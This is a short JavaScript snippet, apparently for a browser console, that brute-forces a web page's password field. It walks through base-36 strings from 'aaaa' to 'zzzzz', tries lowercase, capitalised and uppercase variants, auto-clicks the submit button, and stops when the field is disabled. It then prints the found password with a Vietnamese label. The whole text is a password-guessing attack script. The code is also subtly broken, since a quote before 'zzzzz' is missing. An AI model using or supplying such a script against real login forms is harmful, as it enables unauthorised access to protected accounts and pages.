﻿let str = "";
for(i=parseInt("aaaa", 36);i<=parseInt(zzzzz", 36);i++)
{
	str = i.toString(36);
	console.log(str);
	document.getElementById("pass").value = str;
	document.getElementById('submitPass').click();	
	if(document.getElementById("pass").disabled == true){ 
        break;
	}
	else{
		str = str.charAt(0).toUpperCase() + str.slice(1);	
		console.log(str);
		document.getElementById("pass").value = str;
		document.getElementById('submitPass').click();	
		if(document.getElementById("pass").disabled == true){ 
			break;
		}		
		else{
			str = str.toUpperCase();
			console.log(str);
			document.getElementById("pass").value = str;
			document.getElementById('submitPass').click();	
			if(document.getElementById("pass").disabled == true){ 
				break;
			}	
		}
	}
}	
console.log('Pass là: ' + str);
